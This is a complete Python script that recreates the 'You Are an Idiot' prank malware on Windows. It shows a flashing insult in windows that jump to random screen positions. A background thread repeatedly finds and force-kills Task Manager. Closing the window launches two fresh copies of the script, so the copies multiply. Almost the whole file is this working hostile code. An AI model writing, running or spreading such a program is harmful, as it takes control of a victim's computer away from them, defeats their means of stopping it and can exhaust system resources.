import pygame
import sys
import random
import subprocess
import os
import time
import pygetwindow as gw
import pyautogui
import psutil

# Initialize Pygame
pygame.init()

# Set up display dimensions
window_x = 720
window_y = 480

# Define colors
colors = [
    pygame.Color(255, 0, 0),   # Red
    pygame.Color(0, 255, 0),   # Green
    pygame.Color(0, 0, 255),   # Blue
    pygame.Color(255, 255, 0), # Yellow
    pygame.Color(255, 165, 0), # Orange
    pygame.Color(128, 0, 128), # Purple
    pygame.Color(0, 255, 255)  # Cyan
]

# Set up fonts
font = pygame.font.SysFont(None, 50)

# Name of the Task Manager process
task_manager_processes = ['Taskmgr.exe']  # For Windows

def is_task_manager_running():
    # Iterate over all running processes
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] in task_manager_processes:
                return proc.info['pid']
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return None

def close_task_manager(pid):
    try:
        p = psutil.Process(pid)
        p.kill()  # or p.kill() to forcefully kill it
        print(f"Closed Task Manager (PID: {pid})")
    except Exception as e:
        print(f"Error closing Task Manager: {e}")

# Function to display text with some random jitter and color change
def display_message(screen):
    screen.fill(pygame.Color(0, 0, 0))  # Fill screen with black
    color = random.choice(colors)       # Choose a random color
    message = font.render('You Are an Idiot!', True, color)  # Render message with chosen color
    x = random.randint(0, window_x - message.get_width())
    y = random.randint(0, window_y - message.get_height())
    screen.blit(message, (x, y))
    pygame.display.flip()

# Function to create and position a new window randomly
def create_and_position_window():
    # Create the Pygame window
    screen = pygame.display.set_mode((window_x, window_y))
    pygame.display.set_caption('You Are an Idiot!')

    # Display the message
    display_message(screen)

    # Sleep to ensure window is initialized
    time.sleep(0.1)

    # Function to position the window at a random location
    def position_window_randomly():
        for _ in range(10):  # Retry up to 10 times
            windows = gw.getWindowsWithTitle('You Are an Idiot!')
            if windows:
                window = windows[0]  # Assuming the newly created window is the first one
                screen_width, screen_height = pyautogui.size()
                new_x = random.randint(0, screen_width - window.width)
                new_y = random.randint(0, screen_height - window.height)
                window.moveTo(new_x, new_y)
                return
            time.sleep(0.5)  # Wait a bit before retrying

    position_window_randomly()

def run_monitoring():
    print("Monitoring Task Manager...")
    while True:
        pid = is_task_manager_running()
        if pid:
            close_task_manager(pid)
        time.sleep(0.1)  # Check every second

# Main loop
def main_loop():
    # Start the monitoring in a separate thread
    import threading
    monitoring_thread = threading.Thread(target=run_monitoring, daemon=True)
    monitoring_thread.start()

    # Create the initial window
    create_and_position_window()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                # Create new instances before exiting
                for _ in range(2):  # Number of new instances to open
                    script_path = os.path.abspath(__file__)
                    if sys.platform == 'win32':
                        subprocess.Popen(['python', script_path], shell=True)
                    else:
                        subprocess.Popen(['python3', script_path])
                pygame.quit()
                sys.exit()

        # Display the message with some random jitter and color
        display_message(pygame.display.get_surface())
        pygame.time.delay(1)  # Adjust delay to make it more or less annoying

if __name__ == '__main__':
    main_loop()
